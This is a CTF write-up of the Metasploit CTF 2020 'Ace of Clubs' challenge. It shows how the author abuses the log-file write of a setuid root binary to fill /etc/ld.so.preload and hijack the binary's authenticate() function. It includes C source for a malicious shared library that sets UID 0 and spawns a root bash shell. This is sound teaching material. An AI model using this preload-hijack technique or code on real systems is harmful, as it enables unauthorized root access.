title: "Metasploit CTF: 'Ace of Clubs'"
---

During the weekend of the 5th December I had a little time to participate in the Metasploit CTF 2020, one particular challenge I found quite interesting, this was mainly because the route I decided to take was probably a little different and a lot more involved but I wanted to test myself! So let's crack on...

## Challenge: Ace of Clubs

The challenge begins with an SSH server listening on port 9009, after connecting you're presented with a banner requesting you to login as the user admin but doesn't mention the password, a few simple guesses and I login with the password 'password' and I obtain a shell with user or low privileges.

After light enumeration I find the flag `/etc/ace_of_spades.jpg` only readable as root, a binary `/opt/vpn_connect` with set user ID on execution, and the owner root - this must be the path to flag, if there any vulnerabilities it may be an easy privilege escalation.

First let us see if the binary has any dependencies, using ldd will help identify what shared objects are required by the binary, and this particular binary requires the library `/usr/lib/libvpnauthcustom.so` to run.

Using NM to list the symbol table in the binary, grepping for 'T' or 't' to filter on symbols in the data section. You could say the symbols are mapping between the functions and the instructions within the binary that may be used during execution.

Running the binary we're prompted with usage instructions, the binary requires three parameters, username, password, and a log path. Let see if we can get the username & password using GDB, I use pwndbg which is pretty great for any sort of reverse engineering, I highly recommened it. You can set the binary arguments, and set a breakpoint on the `authenticate` function to stop execution and return control back:

Now I can step a few instructions to the string compare function where our user supplied input is being compared to the string `username` - this must be the username! Repeating this process I also get the password.

Excellent, now we know the username and password surely we'll get the flag, let's run the binary with the correct username and password.... Fail, nothing happens. To save time let us see what we get with strace, a great utility to trace system call activity.

The notable system calls here are `umask` which sets the file creation mask, then `openat` to get a file descriptor with the flags 'O_WRONLY | O_CREAT', write only or create if the file doesn't exist, then we see a few `write` calls with logging information followed by a `close` on the file descriptor.

As the binary is running as root, it's effectively an arbitrary write, the contents include the username and password which we control, great! Here I tried to write to `/etc/passwd` or `/etc/shadow` but I couldn't get the format correct, this is where I decided to get a root shell instead :-)

### Privilege escalation

The binary uses a shared library to provide the `authenticate` function which is dynamically loaded at run-time. The shared library is located in `/usr/lib/libvpnauthcustom.so` and we only have read permissions, how can this be abused?

Linux provides functionality for preloading libraries through `LD_PRELOAD` environment variable or `/etc/ld.so.preload`, preloading allows a user to supply a shared library which is loaded before other libraries. If I create and compile a library with a function named `authenticate` can I hijack the execution of the binary?

Here is rough (don't judge me!) sourcecode with a single function `authenticate` when called by the binary will set the UID to 0 and call the system function with argument `/bin/bash` giving us a root shell!  

```
cat > /tmp/exploit.c << "EOF"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int authenticate(const char *str,const char *str1) {
    uid_t uid = getuid();
    uid_t euid = geteuid();
    printf("Uid: %i, Euid: %i\n",uid,euid);

    setuid(0);
    setgid(0);
    
    uid_t puid = getuid();
    uid_t peuid = geteuid();
    printf("Uid: %i, Euid: %i\n",puid,peuid);

    system("/bin/bash");
    return 0;
}
EOF
```
Here I compile the source code into a shared object:

Then I can abuse the log functionalilty to write the string '/tmp/preload.so' to `/etc/ld.so.preload`:

![alt text](https://ben0.github.io/assets/images//9009_write_ld_so_payload1.PNG "Abusing the -l switch")

If you look at the last image, you can see the errors produced by `ld.so` which is responsible for finding and loading shared libraries. Any shared libraries can be specificed seperated by white spaces so it's a fairly relaxed syntax, there are plenty of errors where `ld.so` can't find the library specificed but it still finds our malicious shared library and is preloaded when a binary in run. 

I've created and compiled a shared object library, abused the function `log_res` in the binary 'vpn_connect' to add the shared library to `ld.so.preload`, then execute the `vpn_connect` binary again, the malicious shared library is loaded, which calls the `authenticate` function in our library rather the intended library, this then uses the system call to replace the current process with `/bin/bash`!

### Next steps

The shared object isn't perfect, but we could improve it by removing some of the printf statements and deleting `/etc/ld.so.preload` to stop those nagging error messages:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int authenticate(const char *str,const char *str1) {
    setuid(0);
    setgid(0);
    unlink("/etc/ld.so.preload");
    system("/bin/bash");
    return 0;
}
```
